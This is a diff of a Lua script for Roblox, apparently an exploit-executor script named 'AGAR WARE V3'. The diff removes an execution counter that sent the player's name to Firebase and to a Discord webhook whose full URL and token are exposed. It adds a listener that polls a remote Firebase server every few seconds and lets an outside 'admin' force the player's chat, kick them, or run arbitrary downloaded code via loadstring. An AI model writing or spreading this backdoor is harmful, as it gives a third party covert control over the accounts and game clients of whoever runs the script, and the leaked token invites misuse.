@@ -1,72 +1,71 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
+-- AGAR WARE V3 - COMMAND LISTENER
+-- Users execute this and you can control them from your admin panel
 
 local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1504421690610946173/Q7J4q10dMdKyr3EXfog5iqy6qMsOWsWdu_e-CSH2gZqCi--HeVI-mDWr9qeQ57kuN76p"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local LocalPlayer = Players.LocalPlayer
 
 local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
-local _plr = Players.LocalPlayer
 
--- Get current total execution count from Firebase
-local function getTotalExecutionCount()
-	local success, response = pcall(function()
-		return _req({
-			Url = FIREBASE_URL .. "/view/totalexecutioncount.json",
+local lastCommandTimestamp = 0
+
+print("🎮 AGAR WARE V3 Control Listener Active")
+print("✅ You can now be controlled by admins")
+
+-- Function to check for commands
+local function checkForCommands()
+	pcall(function()
+		local response = _req({
+			Url = FIREBASE_URL .. "/commands/" .. LocalPlayer.Name .. ".json",
 			Method = "GET"
 		})
-	end)
-	
-	if success and response.StatusCode == 200 then
-		local count = HttpService:JSONDecode(response.Body)
-		if type(count) == "number" then
-			return count
-		end
-	end
-	
-	return 0
-end
-
--- Update total execution count in Firebase
-local function updateTotalExecutionCount(newCount)
-	pcall(function()
-		_req({
-			Url = FIREBASE_URL .. "/view/totalexecutioncount.json",
-			Method = "PUT",
-			Headers = { ["Content-Type"] = "application/json" },
-			Body = HttpService:JSONEncode(newCount)
-		})
-	end)
-end
-
--- Send Discord webhook
-local function sendWebhook(executionCount)
-	pcall(function()
-		local embed = {
-			title = "AGAR WARE V3",
-			description = string.format("This script has been executed **%d** times.", executionCount),
-			color = 2346240,
-			footer = {
-				text = string.format("Last Execution: %s | %s", _plr.Name, os.date("%Y-%m-%d %I:%M %p"))
-			}
-		}
 		
-		_req({
-			Url = WEBHOOK_URL,
-			Method = "POST",
-			Headers = { ["Content-Type"] = "application/json" },
-			Body = HttpService:JSONEncode({ embeds = { embed } })
-		})
+		if response.StatusCode == 200 then
+			local commandData = HttpService:JSONDecode(response.Body)
+			
+			if commandData and commandData.timestamp > lastCommandTimestamp then
+				lastCommandTimestamp = commandData.timestamp
+				
+				-- Execute command based on type
+				if commandData.type == "forcechat" then
+					-- Force chat
+					print("💬 Forced to say:", commandData.message)
+					pcall(function()
+						if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+							-- New chat system
+							TextChatService.TextChannels.RBXGeneral:SendAsync(commandData.message)
+						else
+							-- Legacy chat system
+							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(commandData.message, "All")
+						end
+					end)
+					
+				elseif commandData.type == "kick" then
+					-- Kick player (disconnect)
+					print("❌ You are being kicked")
+					LocalPlayer:Kick("You have been kicked by an admin.")
+					
+				elseif commandData.type == "execute" then
+					-- Execute code
+					print("⚡ Executing code from admin")
+					pcall(function()
+						loadstring(commandData.code)()
+					end)
+				end
+				
+				-- Delete command after executing
+				_req({
+					Url = FIREBASE_URL .. "/commands/" .. LocalPlayer.Name .. ".json",
+					Method = "DELETE"
+				})
+			end
+		end
 	end)
 end
 
--- Main execution
-local currentCount = getTotalExecutionCount()
-local newCount = currentCount + 1
-
--- Update Firebase
-updateTotalExecutionCount(newCount)
-
--- Send webhook
-sendWebhook(newCount)
-
-print("✅ Total executions updated: " .. newCount)
+-- Check for commands every 3 seconds
+while wait(3) do
+	checkForCommands()
+end
